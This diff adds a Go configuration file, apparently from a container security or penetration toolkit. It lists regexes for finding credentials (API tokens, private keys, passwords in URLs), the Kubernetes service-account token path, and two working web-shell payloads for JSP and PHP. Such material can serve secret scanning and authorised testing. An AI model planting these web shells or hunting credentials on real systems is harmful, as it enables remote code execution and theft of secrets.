@@ -1,0 +1,56 @@
+/*
+Copyright 2022 The Authors of Internal CDK compliance tooling contributors
+
+Licensed under the Apache License, Version 2.0 (the "License");
+you may not use this file except in compliance with the License.
+You may obtain a copy of the License at
+
+    http://www.apache.org/licenses/LICENSE-2.0
+
+Unless required by applicable law or agreed to in writing, software
+distributed under the License is distributed on an "AS IS" BASIS,
+WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+See the License for the specific language governing permissions and
+limitations under the License.
+*/
+
+package conf
+
+// scan file text to find credentials surface
+// pkg/profile entry/file_scan.go
+type textScanRules struct {
+	MaxFileByte        int64             // skip largefile
+	SkipExecutableFile bool              // skip executable file
+	RegexList          map[string]string // regex to match file text
+}
+
+var ScanFileTextConf = textScanRules{
+	MaxFileByte:        1024 * 1024,
+	SkipExecutableFile: true,
+	RegexList: map[string]string{
+		"Slack Token":                  "(xox[p|b|o|a]-[0-9]{12}-[0-9]{12}-[0-9]{12}-[a-z0-9]{32})",
+		"RSA private key":              "-----BEGIN RSA PRIVATE KEY-----",
+		"SSH (OPENSSH) private key":    "-----BEGIN OPENSSH PRIVATE KEY-----",
+		"SSH (DSA) private key":        "-----BEGIN DSA PRIVATE KEY-----",
+		"SSH (EC) private key":         "-----BEGIN EC PRIVATE KEY-----",
+		"PGP private key block":        "-----BEGIN PGP PRIVATE KEY BLOCK-----",
+		"Facebook Oauth":               "[f|F][a|A][c|C][e|E][b|B][o|O][o|O][k|K].{0,30}['\"\\s][0-9a-f]{32}['\"\\s]",
+		"Twitter Oauth":                "[t|T][w|W][i|I][t|T][t|T][e|E][r|R].{0,30}['\"\\s][0-9a-zA-Z]{35,44}['\"\\s]",
+		"GitHub":                       "[g|G][i|I][t|T][h|H][u|U][b|B].{0,30}['\"\\s][0-9a-zA-Z]{35,40}['\"\\s]",
+		"Google Oauth":                 "(\"client_secret\":\\s*?\"[a-zA-Z0-9-_]{24}\")",
+		"AWS API Key":                  "AKIA[A-Z0-9]{16}",
+		"Heroku API Key":               "[h|H][e|E][r|R][o|O][k|K][u|U].{0,30}[0-9A-F]{8}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{12}",
+		"Generic Secret":               "[s|S][e|E][c|C][r|R][e|E][t|T].{0,30}['\"\\s][0-9a-zA-Z]{32,45}['\"\\s]",
+		"Generic API Key":              "[a|A][p|P][i|I][_]?[k|K][e|E][y|Y].{0,30}['\"\\s][0-9a-zA-Z]{32,45}['\"\\s]",
+		"Slack Webhook":                "https://hooks\\.slack\\.com/services/T[a-zA-Z0-9_]{8}/B[a-zA-Z0-9_]{8}/[a-zA-Z0-9_]{24}",
+		"Google (GCP) Service-account": "\"type\": \"service_account\"",
+		"Twilio API Key":               "SK[a-z0-9]{32}",
+		"Password in URL":              "[a-zA-Z]{3,10}://[^/\\s:@]{3,20}:[^/\\s:@]{3,20}@.{1,100}[\"'\\s]",
+	},
+}
+
+var K8sSATokenDefaultPath = "/var/run/secrets/kubernetes.io/serviceaccount/token"
+
+var WebShellCodeJSP = "<%Runtime.getRuntime().exec(request.getParameter(\"$SECRET_PARAM\"));%>"
+
+var WebShellCodePHP = "<?php @eval($_POST['$SECRET_PARAM']);?>"
